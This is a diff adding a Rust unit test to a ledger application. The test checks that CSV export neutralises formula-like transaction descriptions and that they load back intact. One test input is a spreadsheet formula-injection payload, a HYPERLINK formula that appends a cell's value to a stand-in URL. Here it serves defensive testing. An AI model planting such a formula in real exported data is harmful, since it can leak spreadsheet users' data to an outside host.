@@ -2041,6 +2041,63 @@ mod tests {
         let _ = std::fs::remove_file(&csv_path);
     }
 
+    #[test]
+    fn formula_like_text_is_escaped_in_csv_and_round_trips() {
+        let temp = TempDb::new();
+        let at_home = open_account(&temp, DEFAULT_LEDGER_ID, "@Home", AccountClass::Cash);
+        let descriptions = [
+            "=HYPERLINK(\"http://x/\"&A1,\"Click\")",
+            "-5% off",
+            "\t+1",
+            "'quoted",
+            "Milk",
+            "a=b",
+        ];
+        for description in descriptions {
+            temp.store()
+                .insert(&draft("2026-01-05", description, "4", "Food"))
+                .unwrap();
+        }
+        temp.store()
+            .insert(&transfer("2026-01-06", "10", MAIN_ACCOUNT, at_home))
+            .unwrap();
+        let accounts = Accounts::new(
+            investments(&temp, DEFAULT_LEDGER_ID)
+                .list_accounts()
+                .unwrap(),
+        );
+
+        let csv_path = temp.path.with_extension("csv");
+        let exported: Vec<_> = temp
+            .store()
+            .list()
+            .unwrap()
+            .iter()
+            .map(|tx| accounts.csv_row(tx))
+            .collect();
+        crate::csv_io::save_transactions(&exported, &csv_path).unwrap();
+        let raw = std::fs::read_to_string(&csv_path).unwrap();
+        assert!(raw.contains("\"'=HYPERLINK("));
+        assert!(raw.contains(",'-5% off,"));
+        assert!(raw.contains(",''quoted,"));
+        assert!(raw.contains(",Milk,"));
+        assert!(raw.contains(",a=b,"));
+        assert!(raw.contains(",Main Account,'@Home"));
+
+        let rows: Vec<Transaction> = crate::csv_io::load_transactions(&csv_path)
+            .unwrap()
+            .iter()
+            .map(|row| accounts.link_csv(row).unwrap())
+            .collect();
+        for description in descriptions {
+            assert!(rows.iter().any(|tx| tx.description == description));
+        }
+        assert!(rows.iter().any(|tx| tx.to_account_id == Some(at_home)));
+        assert_eq!(temp.store().import_merge(&rows).unwrap().added, 0);
+
+        let _ = std::fs::remove_file(&csv_path);
+    }
+
     // Small helper to turn a draft into a Transaction for import tests.
     impl TransactionDraft {
         fn into_transaction(self) -> Transaction {
